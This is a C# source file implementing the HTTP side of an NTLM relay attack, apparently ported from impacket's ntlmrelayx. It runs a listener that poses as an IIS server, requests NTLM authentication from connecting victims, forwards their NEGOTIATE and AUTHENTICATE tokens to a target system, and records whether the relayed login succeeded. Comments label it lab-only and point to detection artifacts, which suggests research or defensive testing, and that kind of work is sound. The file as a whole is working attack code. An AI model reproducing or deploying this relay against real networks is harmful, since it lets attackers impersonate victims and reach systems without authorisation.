using System.Net;
using System.Net.Sockets;
using System.Text;
using DotNetPacket.Protocols.Ntlm;

namespace DotNetPacket.Protocols.Http;

/// <summary>What happened on one relayed HTTP victim connection (mirrors the SMB relay outcome).</summary>
public sealed class HttpRelayOutcome
{
    public required string VictimEndpoint { get; init; }

    /// <summary>The target's NTLM CHALLENGE (Type 2) the relay handed back to the victim.</summary>
    public required byte[] RelayedChallenge { get; init; }

    /// <summary>The victim's NTLM AUTHENTICATE (Type 3), computed against the relayed challenge.</summary>
    public required byte[] VictimAuthenticate { get; init; }

    /// <summary>The target's NT status for the relayed AUTHENTICATE (SUCCESS = relay authenticated).</summary>
    public required uint TargetStatus { get; init; }

    /// <summary>The HTTP method + path the victim requested (for logging / diffing).</summary>
    public required string RequestLine { get; init; }

    public bool Relayed => TargetStatus == 0x00000000;
}

/// <summary>
/// The HTTP side of ntlmrelayx: a minimal HTTP/1.1 server that performs HTTP NTLM authentication
/// (RFC 4559 style: <c>WWW-Authenticate: NTLM</c>) with a victim and relays each NTLM token to a
/// target via an <see cref="IRelayTarget"/>. Port of the handshake in impacket's
/// <c>examples/ntlmrelayx/servers/httprelayserver.py</c>.
///
/// LAB-ONLY. HTTP carries the NTLM messages as bare base64 NTLMSSP in the <c>Authorization</c> header
/// (no SPNEGO), so the server decodes them directly; the <see cref="IRelayTarget"/> re-wraps as needed
/// for its target protocol. The detection-relevant artifact is the same as the SMB relay: the
/// challenge returned to the victim is the target's.
/// </summary>
public sealed class HttpRelayServer : IDisposable
{
    private const byte NtlmNegotiate = 0x01; // message type at offset 8
    private const byte NtlmAuthenticate = 0x03;
    private static readonly byte[] NtlmSignature = Encoding.ASCII.GetBytes("NTLMSSP\0");

    private readonly TcpListener _listener;

    public HttpRelayServer(int port, IPAddress? bind = null) =>
        _listener = new TcpListener(bind ?? IPAddress.Loopback, port);

    public void Start() => _listener.Start();

    public int Port => ((IPEndPoint)_listener.LocalEndpoint).Port;

    /// <summary>
    /// Accepts one victim HTTP connection and relays its NTLM authentication through
    /// <paramref name="relay"/>. HTTP NTLM is connection-oriented, so all rounds happen on the one
    /// kept-alive socket: 401 (offer NTLM) → Type 1 → 401 (relayed challenge) → Type 3 → 200/401.
    /// </summary>
    public HttpRelayOutcome AcceptAndRelay(IRelayTarget relay)
    {
        using TcpClient client = _listener.AcceptTcpClient();
        string victim = client.Client.RemoteEndPoint?.ToString() ?? "?";
        using NetworkStream stream = client.GetStream();
        stream.ReadTimeout = 15_000;

        byte[] challenge = Array.Empty<byte>();
        byte[] type3 = Array.Empty<byte>();
        uint status = 0xC000006D; // LOGON_FAILURE until proven otherwise
        string firstRequestLine = string.Empty;

        while (true)
        {
            (string requestLine, var headers) = ReadRequestHead(stream);
            if (requestLine.Length == 0)
            {
                break; // connection closed
            }

            if (firstRequestLine.Length == 0)
            {
                firstRequestLine = requestLine;
            }

            string? auth = headers.TryGetValue("authorization", out string? a) ? a : null;
            if (auth is null || !auth.StartsWith("NTLM ", StringComparison.OrdinalIgnoreCase))
            {
                // No NTLM yet: offer it.
                SendResponse(stream, 401, "Unauthorized", "WWW-Authenticate: NTLM");
                continue;
            }

            byte[] token = Convert.FromBase64String(auth.Substring(5).Trim());
            if (!IsNtlm(token))
            {
                SendResponse(stream, 401, "Unauthorized", "WWW-Authenticate: NTLM");
                continue;
            }

            switch (token[8])
            {
                case NtlmNegotiate:
                    challenge = relay.Negotiate(token);                 // victim Type 1 -> target Type 2
                    SendResponse(stream, 401, "Unauthorized",
                        "WWW-Authenticate: NTLM " + Convert.ToBase64String(challenge));
                    continue;

                case NtlmAuthenticate:
                    type3 = token;
                    status = relay.Authenticate(token, null);           // victim Type 3 -> target
                    SendResponse(stream, status == 0 ? 200 : 401, status == 0 ? "OK" : "Unauthorized",
                        body: status == 0 ? "Relayed.\n" : "Authentication failed.\n");
                    goto done;

                default:
                    SendResponse(stream, 400, "Bad Request");
                    goto done;
            }
        }

    done:
        return new HttpRelayOutcome
        {
            VictimEndpoint = victim,
            RelayedChallenge = challenge,
            VictimAuthenticate = type3,
            TargetStatus = status,
            RequestLine = firstRequestLine,
        };
    }

    private static bool IsNtlm(byte[] token) =>
        token.Length > 8 && token.AsSpan(0, 8).SequenceEqual(NtlmSignature);

    // Reads an HTTP request's start line + headers (up to the blank line). Returns ("", {}) at EOF.
    private static (string RequestLine, Dictionary<string, string> Headers) ReadRequestHead(NetworkStream stream)
    {
        var headers = new Dictionary<string, string>(StringComparer.OrdinalIgnoreCase);
        string requestLine = ReadLine(stream);
        if (requestLine.Length == 0)
        {
            return (string.Empty, headers);
        }

        while (true)
        {
            string line = ReadLine(stream);
            if (line.Length == 0)
            {
                break; // blank line ends the header block
            }

            int colon = line.IndexOf(':');
            if (colon > 0)
            {
                headers[line[..colon].Trim()] = line[(colon + 1)..].Trim();
            }
        }

        // Drain any request body so the next request on this kept-alive socket parses cleanly.
        if (headers.TryGetValue("content-length", out string? cl) && int.TryParse(cl, out int len) && len > 0)
        {
            var body = new byte[len];
            int read = 0;
            while (read < len)
            {
                int n = stream.Read(body, read, len - read);
                if (n <= 0)
                {
                    break;
                }

                read += n;
            }
        }

        return (requestLine, headers);
    }

    private static string ReadLine(NetworkStream stream)
    {
        var sb = new StringBuilder();
        int prev = -1;
        while (true)
        {
            int b = stream.ReadByte();
            if (b < 0)
            {
                return sb.ToString(); // EOF
            }

            if (prev == '\r' && b == '\n')
            {
                sb.Length -= 1; // drop the trailing CR
                return sb.ToString();
            }

            sb.Append((char)b);
            prev = b;
        }
    }

    private static void SendResponse(NetworkStream stream, int code, string reason, string? header = null, string? body = null)
    {
        var sb = new StringBuilder();
        sb.Append($"HTTP/1.1 {code} {reason}\r\n");
        sb.Append("Server: Microsoft-IIS/10.0\r\n"); // realistic server banner (impacket mimics IIS)
        if (header is not null)
        {
            sb.Append(header).Append("\r\n");
        }

        byte[] bodyBytes = body is null ? Array.Empty<byte>() : Encoding.ASCII.GetBytes(body);
        sb.Append($"Content-Length: {bodyBytes.Length}\r\n");
        sb.Append("Connection: keep-alive\r\n");
        sb.Append("\r\n");

        byte[] head = Encoding.ASCII.GetBytes(sb.ToString());
        stream.Write(head, 0, head.Length);
        if (bodyBytes.Length > 0)
        {
            stream.Write(bodyBytes, 0, bodyBytes.Length);
        }

        stream.Flush();
    }

    public void Dispose() => _listener.Stop();
}
